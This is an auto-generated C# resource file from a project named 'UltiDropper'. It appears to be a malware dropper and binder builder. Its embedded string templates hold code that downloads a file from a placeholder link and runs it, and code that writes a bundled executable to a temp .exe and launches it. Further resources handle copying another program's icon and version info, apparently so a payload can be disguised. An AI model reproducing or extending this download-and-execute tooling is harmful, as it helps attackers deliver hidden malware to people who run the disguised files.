﻿//------------------------------------------------------------------------------
// <auto-generated>
//     This code was generated by a tool.
//     Runtime Version:4.0.30319.42000
//
//     Changes to this file may cause incorrect behavior and will be lost if
//     the code is regenerated.
// </auto-generated>
//------------------------------------------------------------------------------

namespace UltiDropper.Properties {
    using System;
    
    
    /// <summary>
    ///   A strongly-typed resource class, for looking up localized strings, etc.
    /// </summary>
    // This class was auto-generated by the StronglyTypedResourceBuilder
    // class via a tool like ResGen or Visual Studio.
    // To add or remove a member, edit your .ResX file then rerun ResGen
    // with the /str option, or rebuild your VS project.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Returns the cached ResourceManager instance used by this class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("UltiDropper.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Overrides the current thread's CurrentUICulture property for all
        ///   resource lookups using this strongly typed resource class.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to Malformatted url given!.
        /// </summary>
        internal static string BadUrl {
            get {
                return ResourceManager.GetString("BadUrl", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to var rm = new ResourceManager(&quot;files&quot;, Assembly.GetExecutingAssembly());
        ///var loc2 = Path.ChangeExtension(Path.GetTempFileName(), &quot;exe&quot;);
        ///var writer = new BinaryWriter(new FileStream(loc2, FileMode.OpenOrCreate));
        ///writer.Write((byte[])rm.GetObject(&quot;[RESOURCE]&quot;));
        ///writer.Close();
        ///Process.Start(loc2);.
        /// </summary>
        internal static string Binder {
            get {
                return ResourceManager.GetString("Binder", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to Executables|*.exe|All Files|*.*.
        /// </summary>
        internal static string ExeFilter {
            get {
                return ResourceManager.GetString("ExeFilter", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to Unable to extract icon.
        /// </summary>
        internal static string ExtractError {
            get {
                return ResourceManager.GetString("ExtractError", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to Icons|*.ico.
        /// </summary>
        internal static string IconFilter {
            get {
                return ResourceManager.GetString("IconFilter", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to UltiDropper.
        /// </summary>
        internal static string Name {
            get {
                return ResourceManager.GetString("Name", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized resource of type System.Byte[].
        /// </summary>
        internal static byte[] ResourceHacker {
            get {
                object obj = ResourceManager.GetObject("ResourceHacker", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to using System.Diagnostics;
        ///using System.IO;
        ///using System.Net;
        ///using System.Reflection;
        ///using System.Resources;
        ///using System;
        ///
        ///namespace Dropper
        ///{
        ///    class Program
        ///    {
        ///        static void Main(string[] args)
        ///        {
        ///			[BINDCODE]
        ///            var loc = Path.ChangeExtension(Path.GetTempFileName(), &quot;exe&quot;);
        ///            using (var wc = new WebClient())
        ///            {
        ///                wc.DownloadFile(&quot;[LINK]&quot;, loc);
        ///            }
        ///            System.Threading.Thread.Sleep(3000);
        ///            Pr [rest of string was truncated]&quot;;.
        /// </summary>
        internal static string Stub {
            get {
                return ResourceManager.GetString("Stub", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Looks up a localized string similar to Unable to copy version info.
        /// </summary>
        internal static string VersionInfoFailure {
            get {
                return ResourceManager.GetString("VersionInfoFailure", resourceCulture);
            }
        }
    }
}